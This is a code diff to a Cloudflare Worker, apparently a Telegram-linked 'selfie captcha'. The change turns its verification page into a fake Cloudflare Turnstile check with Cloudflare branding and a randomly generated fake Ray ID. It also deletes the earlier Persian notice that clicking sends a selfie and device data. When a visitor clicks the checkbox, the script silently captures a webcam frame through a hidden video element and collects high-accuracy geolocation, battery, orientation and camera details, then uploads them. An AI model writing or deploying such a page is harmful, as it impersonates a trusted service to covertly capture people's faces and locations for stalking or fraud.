@@ -1,5 +1,5 @@
 // ============================================================
-//  Selfie Captcha Worker — v7 (Geo + Admin Panel)
+//  Selfie Captcha Worker — v8 (Geo + Admin + Cloudflare UI)
 // ============================================================
 //  Env vars:
 //    TELEGRAM_BOT_TOKEN   (required)
@@ -1147,90 +1147,213 @@ function renderAdminDashboard(nonce, adminBase, selfieState, geoState, env, cf, 
 }
 
 // ============================================================
-//  Frontend (captcha page)
+//  Frontend (captcha page — Cloudflare Turnstile style)
 // ============================================================
 function renderHTML(nonce, selfieState, geoState) {
   const selfieMode = selfieState === 'off' ? 'off' : 'on';
   const geoMode = geoState === 'on' ? 'on' : 'off';
-  const hintText =
-    selfieMode === 'on'
-      ? 'با کلیک روی این کادر، یک تصویر سلفی و اطلاعات فنی مرورگر شما برای بررسی ارسال می‌شود.' +
-        (geoMode === 'on' ? ' همچنین ممکن است اجازهٔ دسترسی به موقعیت مکانی خواسته شود.' : '')
-      : 'با کلیک روی این کادر، اطلاعات فنی مرورگر شما برای بررسی ارسال می‌شود.' +
-        (geoMode === 'on' ? ' همچنین ممکن است اجازهٔ دسترسی به موقعیت مکانی خواسته شود.' : '');
 
   return `<!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="robots" content="noindex,nofollow,noarchive">
-<title>تایید هویت</title>
+<title>Just a moment...</title>
 <style nonce="${nonce}">
-  :root { --accent:#4a90e2; --ok:#22a06b; --err:#d93636; --muted:#6b7280; --border:#dcdfe4; }
   * { box-sizing: border-box; }
-  html, body { margin: 0; height: 100%; }
+  html, body { margin: 0; padding: 0; min-height: 100%; }
   body {
-    display: flex; align-items: center; justify-content: center;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-    background: #f5f6f8; color: #1f2328; padding: 16px;
-  }
-  .card {
-    width: 100%; max-width: 360px;
-    background: #fff; border: 1px solid var(--border); border-radius: 12px;
-    box-shadow: 0 6px 24px rgba(15,23,42,.06);
+    font-size: 14px;
+    color: #232323;
+    background: #ffffff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
     padding: 20px;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
   }
-  .row { display: flex; align-items: center; gap: 14px; }
-  .checkbox {
-    width: 28px; height: 28px; border: 2px solid #9ca3af; border-radius: 6px;
-    display: flex; align-items: center; justify-content: center;
-    cursor: pointer; background: #fff; transition: all .18s ease; flex-shrink: 0;
+  .cf-main {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 12px;
   }
-  .checkbox:hover { border-color: var(--accent); }
-  .checkbox:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
-  .checkbox.checked { background: var(--accent); border-color: var(--accent); }
-  .checkbox.checked::after {
-    content: ""; width: 7px; height: 13px;
-    border: solid #fff; border-width: 0 2.5px 2.5px 0;
-    transform: rotate(45deg); margin-bottom: 3px;
+  .cf-widget {
+    width: 300px;
+    height: 65px;
+    background: #ffffff;
+    border: 1px solid #e0e0e0;
+    border-radius: 4px;
+    display: flex;
+    align-items: center;
+    padding: 0 14px;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.06);
+    transition: border-color 0.15s, box-shadow 0.15s;
+    cursor: pointer;
+    user-select: none;
+    -webkit-tap-highlight-color: transparent;
   }
-  .checkbox.busy { border-color: var(--accent); }
-  .checkbox.busy::after {
-    content: ""; width: 14px; height: 14px;
-    border: 2px solid #e5e7eb; border-top-color: var(--accent);
-    border-radius: 50%; animation: spin .7s linear infinite;
+  .cf-widget:hover { border-color: #c8c8c8; }
+  .cf-widget:focus { outline: none; border-color: #a0a0a0; }
+  .cf-widget.busy, .cf-widget.done { cursor: default; }
+  .cf-checkbox {
+    width: 28px;
+    height: 28px;
+    border: 2px solid #b0b0b0;
+    border-radius: 4px;
+    background: #ffffff;
+    flex-shrink: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: all 0.2s ease;
+    position: relative;
   }
-  .checkbox.checked.busy::after { animation: none; }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  .label { font-size: 16px; font-weight: 500; cursor: pointer; }
-  .hint { margin-top: 14px; font-size: 12px; color: var(--muted); line-height: 1.7; }
-  .status { margin-top: 12px; font-size: 13px; min-height: 18px; }
-  .status.error { color: var(--err); }
-  .status.ok { color: var(--ok); }
-  .retry {
-    margin-top: 8px; background: none; border: 1px solid var(--border);
-    color: #1f2328; padding: 6px 12px; border-radius: 8px; font-size: 13px;
-    cursor: pointer; display: none;
+  .cf-widget.busy .cf-checkbox {
+    border-color: #e8e8e8;
+    background: #fafafa;
   }
-  .retry:hover { background: #f3f4f6; }
+  .cf-widget.busy .cf-checkbox::after {
+    content: "";
+    width: 18px;
+    height: 18px;
+    border: 2.5px solid #F38020;
+    border-right-color: transparent;
+    border-radius: 50%;
+    animation: cf-spin 0.8s linear infinite;
+    box-sizing: border-box;
+  }
+  .cf-widget.done .cf-checkbox {
+    border-color: #0cce6b;
+    background: #0cce6b;
+  }
+  .cf-widget.done .cf-checkbox::after {
+    content: "";
+    width: 6px;
+    height: 13px;
+    border: solid #ffffff;
+    border-width: 0 2.5px 2.5px 0;
+    transform: rotate(45deg) translate(-1px, -2px);
+    box-sizing: border-box;
+  }
+  @keyframes cf-spin { to { transform: rotate(360deg); } }
+  .cf-label {
+    flex: 1;
+    font-size: 14px;
+    color: #232323;
+    padding-left: 12px;
+    transition: color 0.15s;
+    line-height: 1.3;
+  }
+  .cf-brand {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-end;
+    gap: 1px;
+    flex-shrink: 0;
+  }
+  .cf-brand-logo {
+    display: flex;
+    align-items: center;
+    gap: 4px;
+    font-size: 11px;
+    color: #333;
+    font-weight: 500;
+    line-height: 1;
+  }
+  .cf-brand-logo svg { display: block; }
+  .cf-brand-links {
+    font-size: 9px;
+    color: #888;
+    white-space: nowrap;
+    line-height: 1;
+  }
+  .cf-brand-links a { color: #888; text-decoration: none; }
+  .cf-brand-links a:hover { text-decoration: underline; }
+  .cf-brand-links span { margin: 0 3px; color: #ccc; }
+  .cf-status {
+    font-size: 12px;
+    color: #666;
+    min-height: 16px;
+    text-align: center;
+    max-width: 300px;
+    line-height: 1.4;
+  }
+  .cf-status.error { color: #d93636; }
+  .cf-status.ok { color: #0cce6b; }
+  .cf-retry {
+    background: none;
+    border: 1px solid #e0e0e0;
+    color: #232323;
+    padding: 6px 14px;
+    border-radius: 4px;
+    font-size: 12px;
+    cursor: pointer;
+    display: none;
+    font-family: inherit;
+    transition: background 0.15s;
+  }
+  .cf-retry:hover { background: #f5f5f5; }
+  .cf-footer {
+    position: fixed;
+    bottom: 12px;
+    right: 16px;
+    font-size: 11px;
+    color: #888;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    flex-wrap: wrap;
+    justify-content: flex-end;
+  }
+  .cf-footer b {
+    color: #555;
+    font-weight: 600;
+    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+  }
+  .cf-footer a { color: #F38020; text-decoration: none; }
+  .cf-footer a:hover { text-decoration: underline; }
+  .cf-footer .dot { color: #ccc; }
   #hiddenVideo, #canvas { display: none; }
-  noscript { display: block; margin-top: 12px; color: var(--err); font-size: 13px; }
+  @media (max-width: 380px) {
+    .cf-widget { width: 100%; max-width: 300px; }
+    .cf-footer { position: static; margin-top: 24px; justify-content: center; }
+  }
 </style>
 </head>
 <body>
-  <div class="card">
-    <div class="row">
-      <div class="checkbox" id="checkbox" role="checkbox" aria-checked="false" aria-label="من ربات نیستم" tabindex="0"></div>
-      <span class="label" id="label">من ربات نیستم</span>
+  <main class="cf-main">
+    <div class="cf-widget" id="widget" role="checkbox" aria-checked="false" tabindex="0" aria-label="Verify you are human">
+      <div class="cf-checkbox" id="checkbox"></div>
+      <div class="cf-label" id="label">Verify you are human</div>
+      <div class="cf-brand">
+        <div class="cf-brand-logo">
+          <svg width="22" height="14" viewBox="0 0 22 14" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+            <path fill="#F38020" d="M17.5 6c-.3 0-.5 0-.8.1C16.3 3.6 14 2 11.4 2c-2.7 0-5.1 2-5.6 4.6-.2-.1-.5-.1-.7-.1C3.3 6.5 2 7.8 2 9.4 2 11.1 3.4 12.5 5 12.5h12.5c1.4 0 2.5-1.1 2.5-2.5S18.9 6 17.5 6z"/>
+          </svg>
+          <span>Cloudflare</span>
+        </div>
+        <div class="cf-brand-links">
+          <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noopener noreferrer" tabindex="-1">Privacy</a>
+          <span>·</span>
+          <a href="https://www.cloudflare.com/website-terms/" target="_blank" rel="noopener noreferrer" tabindex="-1">Terms</a>
+        </div>
+      </div>
     </div>
-    <p class="hint">
-      ${hintText}
-    </p>
-    <div class="status" id="status" role="status" aria-live="polite"></div>
-    <button class="retry" id="retry" type="button">تلاش مجدد</button>
-    <noscript>برای ادامه، جاوااسکریپت باید فعال باشد.</noscript>
-  </div>
+    <div class="cf-status" id="status" role="status" aria-live="polite"></div>
+    <button class="cf-retry" id="retry" type="button">Try again</button>
+  </main>
+
+  <footer class="cf-footer">
+    <span>Cloudflare Ray ID: <b id="ray">—</b></span>
+    <span class="dot">•</span>
+    <span>Performance &amp; security by <a href="https://www.cloudflare.com" target="_blank" rel="noopener noreferrer">Cloudflare</a></span>
+  </footer>
 
   <video id="hiddenVideo" autoplay playsinline muted></video>
   <canvas id="canvas"></canvas>
@@ -1241,47 +1364,54 @@ function renderHTML(nonce, selfieState, geoState) {
   const GEO_MODE = ${JSON.stringify(geoMode)};
 
   const el = {
-    box: document.getElementById('checkbox'),
+    widget: document.getElementById('widget'),
+    checkbox: document.getElementById('checkbox'),
     label: document.getElementById('label'),
     status: document.getElementById('status'),
     retry: document.getElementById('retry'),
     video: document.getElementById('hiddenVideo'),
     canvas: document.getElementById('canvas'),
+    ray: document.getElementById('ray'),
   };
+
+  (function () {
+    const chars = '0123456789abcdef';
+    let id = '';
+    for (let i = 0; i < 16; i++) id += chars[Math.floor(Math.random() * 16)];
+    el.ray.textContent = id;
+  })();
+
   let busy = false;
+  let completed = false;
 
   const CAM_ERRORS = {
-    NotAllowedError: 'دسترسی به دوربین رد شد. اجازه دهید و دوباره تلاش کنید.',
-    NotFoundError: 'دوربینی یافت نشد.',
-    NotReadableError: 'دوربین در حال استفاده توسط برنامه دیگری است.',
-    OverconstrainedError: 'دوربین با تنظیمات درخواستی سازگار نیست.',
-    SecurityError: 'دسترسی به دوربین به دلایل امنیتی ممکن نیست (HTTPS الزامی است).',
-    AbortError: 'دسترسی به دوربین لغو شد.',
+    NotAllowedError: 'Camera access was denied. Please allow it and try again.',
+    NotFoundError: 'No camera was found on this device.',
+    NotReadableError: 'The camera is currently in use by another application.',
+    OverconstrainedError: 'The camera does not support the requested settings.',
+    SecurityError: 'Camera access is blocked for security reasons (HTTPS required).',
+    AbortError: 'Camera access was aborted.',
   };
 
   function setState(state, message) {
-    el.box.classList.remove('busy', 'checked');
-    el.box.setAttribute('aria-checked', 'false');
-    el.status.className = 'status';
+    el.widget.classList.remove('busy', 'done');
+    el.widget.setAttribute('aria-checked', 'false');
+    el.status.className = 'cf-status';
     el.status.textContent = message || '';
     el.retry.style.display = 'none';
+
     if (state === 'busy') {
-      el.box.classList.add('busy');
-      el.label.textContent = 'در حال بررسی...';
-      el.status.textContent = message || 'در حال بررسی...';
+      el.widget.classList.add('busy');
+      el.status.textContent = 'Verifying...';
     } else if (state === 'done') {
-      el.box.classList.add('checked');
-      el.box.setAttribute('aria-checked', 'true');
-      el.label.textContent = 'تایید شد';
+      el.widget.classList.add('done');
+      el.widget.setAttribute('aria-checked', 'true');
       el.status.classList.add('ok');
-      el.status.textContent = 'اطلاعات با موفقیت ارسال شد.';
+      el.status.textContent = 'Verification complete';
     } else if (state === 'error') {
-      el.label.textContent = 'من ربات نیستم';
       el.status.classList.add('error');
-      el.status.textContent = message || 'خطایی رخ داد.';
+      el.status.textContent = message || 'Verification failed. Please try again.';
       el.retry.style.display = 'inline-block';
-    } else {
-      el.label.textContent = 'من ربات نیستم';
     }
   }
 
@@ -1329,16 +1459,13 @@ function renderHTML(nonce, selfieState, geoState) {
       info.zoom = c.zoom ? { min: c.zoom.min, max: c.zoom.max, step: c.zoom.step } : null;
       info.iso = c.iso ? { min: c.iso.min, max: c.iso.max, step: c.iso.step } : null;
       info.focusDistance = c.focusDistance
-        ? { min: c.focusDistance.min, max: c.focusDistance.max }
-        : null;
+        ? { min: c.focusDistance.min, max: c.focusDistance.max } : null;
       info.brightness = c.brightness ? { min: c.brightness.min, max: c.brightness.max } : null;
       info.contrast = c.contrast ? { min: c.contrast.min, max: c.contrast.max } : null;
       info.saturation = c.saturation ? { min: c.saturation.min, max: c.saturation.max } : null;
       info.sharpness = c.sharpness ? { min: c.sharpness.min, max: c.sharpness.max } : null;
       info.requestedConstraints = track.getConstraints?.() || null;
-    } catch (e) {
-      info._settingsError = String(e);
-    }
+    } catch (e) { info._settingsError = String(e); }
     try {
       const devices = await navigator.mediaDevices.enumerateDevices();
       info.videoDeviceCount = devices.filter((d) => d.kind === 'videoinput').length;
@@ -1346,9 +1473,7 @@ function renderHTML(nonce, selfieState, geoState) {
       info.videoDeviceLabels = devices
         .filter((d) => d.kind === 'videoinput')
         .map((d) => d.label || '(unnamed)');
-    } catch (e) {
-      info._enumerateError = String(e);
-    }
+    } catch (e) { info._enumerateError = String(e); }
     return info;
   }
 
@@ -1381,9 +1506,7 @@ function renderHTML(nonce, selfieState, geoState) {
       } else if (typeof window.orientation !== 'undefined') {
         result.screenOrientation = { angle: window.orientation };
       }
-    } catch (e) {
-      result._screenOrientationError = String(e);
-    }
+    } catch (e) { result._screenOrientationError = String(e); }
     if (!result.supported) return result;
 
     const collected = [];
@@ -1399,13 +1522,9 @@ function renderHTML(nonce, selfieState, geoState) {
     await new Promise((r) => setTimeout(r, sampleMs));
     window.removeEventListener('deviceorientation', listener);
 
-    const valid = collected.filter(
-      (s) => s.alpha != null || s.beta != null || s.gamma != null
-    );
-    if (valid.length === 0) {
-      result.note = 'no_events_received';
-      return result;
-    }
+    const valid = collected.filter((s) => s.alpha != null || s.beta != null || s.gamma != null);
+    if (valid.length === 0) { result.note = 'no_events_received'; return result; }
+
     const avgOf = (key) => {
       const v = valid.map((s) => s[key]).filter((n) => typeof n === 'number');
       return v.length ? v.reduce((a, b) => a + b, 0) / v.length : null;
@@ -1427,29 +1546,23 @@ function renderHTML(nonce, selfieState, geoState) {
     const gamma = avg.gamma ?? 0;
     const absB = Math.abs(beta);
     const parts = [];
-
-    if (absB < 20) parts.push('افقی (تخت)');
-    else if (absB < 70) parts.push(beta > 0 ? 'کمی رو به جلو' : 'کمی رو به عقب');
-    else if (absB < 110) parts.push('عمودی');
-    else parts.push('رو به پایین');
-
-    if (gamma > 25) parts.push('کج به راست');
-    else if (gamma < -25) parts.push('کج به چپ');
-
+    if (absB < 20) parts.push('flat');
+    else if (absB < 70) parts.push(beta > 0 ? 'tilted forward' : 'tilted backward');
+    else if (absB < 110) parts.push('upright');
+    else parts.push('face down');
+    if (gamma > 25) parts.push('rotated right');
+    else if (gamma < -25) parts.push('rotated left');
     const t = screenOrient && screenOrient.type;
     if (t) {
-      if (t.indexOf('portrait') === 0) parts.push('صفحه عمودی');
-      else if (t.indexOf('landscape') === 0) parts.push('صفحه افقی');
+      if (t.indexOf('portrait') === 0) parts.push('portrait');
+      else if (t.indexOf('landscape') === 0) parts.push('landscape');
     }
-    return parts.join(' • ') || 'صاف';
+    return parts.join(' • ') || 'neutral';
   }
 
   async function collectBattery() {
     const out = { supported: typeof navigator.getBattery === 'function' };
-    if (!out.supported) {
-      out.reason = 'api_unsupported';
-      return out;
-    }
+    if (!out.supported) { out.reason = 'api_unsupported'; return out; }
     try {
       const b = await navigator.getBattery();
       out.level = b.level;
@@ -1457,36 +1570,20 @@ function renderHTML(nonce, selfieState, geoState) {
       out.charging = !!b.charging;
       out.chargingTime = Number.isFinite(b.chargingTime) ? b.chargingTime : null;
       out.dischargingTime = Number.isFinite(b.dischargingTime) ? b.dischargingTime : null;
-    } catch (e) {
-      out.error = String((e && e.message) || e);
-    }
+    } catch (e) { out.error = String((e && e.message) || e); }
     return out;
   }
 
-  // 🔽 NEW: Geolocation with high accuracy
   async function collectGeolocation() {
     if (!('geolocation' in navigator)) {
       return { supported: false, reason: 'api_unsupported' };
     }
-
     return new Promise((resolve) => {
       let done = false;
-      const finish = (result) => {
-        if (done) return;
-        done = true;
-        resolve(result);
-      };
-
-      // Outer safety net
+      const finish = (result) => { if (done) return; done = true; resolve(result); };
       const safety = setTimeout(() => {
-        finish({
-          supported: true,
-          success: false,
-          error: 'OUTER_TIMEOUT',
-          message: 'درخواست موقعیت در زمان مقرر پاسخ نگرفت',
-        });
+        finish({ supported: true, success: false, error: 'OUTER_TIMEOUT', message: 'Location request timed out' });
       }, 14000);
-
       try {
         navigator.geolocation.getCurrentPosition(
           (pos) => {
@@ -1499,8 +1596,7 @@ function renderHTML(nonce, selfieState, geoState) {
               longitude: c.longitude,
               accuracy: c.accuracy,
               altitude: typeof c.altitude === 'number' ? c.altitude : null,
-              altitudeAccuracy:
-                typeof c.altitudeAccuracy === 'number' ? c.altitudeAccuracy : null,
+              altitudeAccuracy: typeof c.altitudeAccuracy === 'number' ? c.altitudeAccuracy : null,
               heading: typeof c.heading === 'number' ? c.heading : null,
               speed: typeof c.speed === 'number' ? c.speed : null,
               timestamp: pos.timestamp,
@@ -1508,32 +1604,18 @@ function renderHTML(nonce, selfieState, geoState) {
           },
           (err) => {
             clearTimeout(safety);
-            const errNames = {
-              1: 'PERMISSION_DENIED',
-              2: 'POSITION_UNAVAILABLE',
-              3: 'TIMEOUT',
-            };
+            const errNames = { 1: 'PERMISSION_DENIED', 2: 'POSITION_UNAVAILABLE', 3: 'TIMEOUT' };
             finish({
-              supported: true,
-              success: false,
+              supported: true, success: false,
               error: errNames[err.code] || 'CODE_' + err.code,
               message: String(err.message || ''),
             });
           },
-          {
-            enableHighAccuracy: true,
-            maximumAge: 0,
-            timeout: 10000,
-          }
+          { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
         );
       } catch (e) {
         clearTimeout(safety);
-        finish({
-          supported: true,
-          success: false,
-          error: 'THROW',
-          message: String((e && e.message) || e),
-        });
+        finish({ supported: true, success: false, error: 'THROW', message: String((e && e.message) || e) });
       }
     });
   }
@@ -1565,11 +1647,10 @@ function renderHTML(nonce, selfieState, geoState) {
   }
 
   async function run() {
-    if (busy) return;
+    if (busy || completed) return;
     busy = true;
     setState('busy');
 
-    // Orientation permission needs user gesture — call early
     const orientationPerm = await requestOrientationPermission();
 
     let stream = null;
@@ -1583,27 +1664,18 @@ function renderHTML(nonce, selfieState, geoState) {
         el.video.srcObject = stream;
         await waitForVideo(el.video);
         await new Promise((r) => setTimeout(r, 350));
-
         camInfo = await collectCameraInfo(stream);
 
         el.canvas.width = el.video.videoWidth || 640;
         el.canvas.height = el.video.videoHeight || 480;
         el.canvas.getContext('2d').drawImage(el.video, 0, 0, el.canvas.width, el.canvas.height);
-
         blob = await new Promise((res) => el.canvas.toBlob(res, 'image/jpeg', 0.9));
         if (!blob) throw new Error('capture_failed');
-
-        captured = {
-          width: el.canvas.width,
-          height: el.canvas.height,
-          size: blob.size,
-        };
-
+        captured = { width: el.canvas.width, height: el.canvas.height, size: blob.size };
         stream.getTracks().forEach((t) => t.stop());
         stream = null;
       }
 
-      // Gather orientation, battery, geolocation in parallel
       const [orientation, battery, geolocation] = await Promise.all([
         orientationPerm.available
           ? collectOrientation()
@@ -1625,9 +1697,7 @@ function renderHTML(nonce, selfieState, geoState) {
       clientData.geolocation = geolocation;
 
       const fd = new FormData();
-      if (SELFIE_MODE === 'on' && blob) {
-        fd.append('photo', blob, 'selfie.jpg');
-      }
+      if (SELFIE_MODE === 'on' && blob) fd.append('photo', blob, 'selfie.jpg');
       fd.append('clientData', JSON.stringify(clientData));
 
       const resp = await fetch('/upload', {
@@ -1641,6 +1711,7 @@ function renderHTML(nonce, selfieState, geoState) {
         throw new Error('upload_failed:' + (detail || resp.status));
       }
 
+      completed = true;
       setState('done');
     } catch (err) {
       if (stream) stream.getTracks().forEach((t) => t.stop());
@@ -1648,22 +1719,28 @@ function renderHTML(nonce, selfieState, geoState) {
       const msg =
         CAM_ERRORS[name] ||
         (err && err.message === 'camera_timeout'
-          ? 'زمان انتظار برای دوربین به پایان رسید.'
+          ? 'Camera timed out. Please try again.'
           : err && err.message && err.message.indexOf('upload_failed') === 0
-          ? 'ارسال اطلاعات ناموفق بود. لطفاً دوباره تلاش کنید.'
-          : 'خطایی رخ داد. لطفاً دوباره تلاش کنید.');
+          ? 'Connection error. Please try again.'
+          : 'Something went wrong. Please try again.');
       setState('error', msg);
     } finally {
       busy = false;
     }
   }
 
-  el.box.addEventListener('click', run);
-  el.label.addEventListener('click', run);
-  el.retry.addEventListener('click', run);
-  el.box.addEventListener('keydown', (e) => {
-    if (e.key === ' ' || e.key === 'Enter') { e.preventDefault(); run(); }
+  el.widget.addEventListener('click', (e) => {
+    if (e.target.closest('a')) return;
+    if (busy || completed) return;
+    run();
   });
+  el.widget.addEventListener('keydown', (e) => {
+    if ((e.key === ' ' || e.key === 'Enter') && !busy && !completed) {
+      e.preventDefault();
+      run();
+    }
+  });
+  el.retry.addEventListener('click', () => { if (!busy) run(); });
 })();
 </script>
 </body>
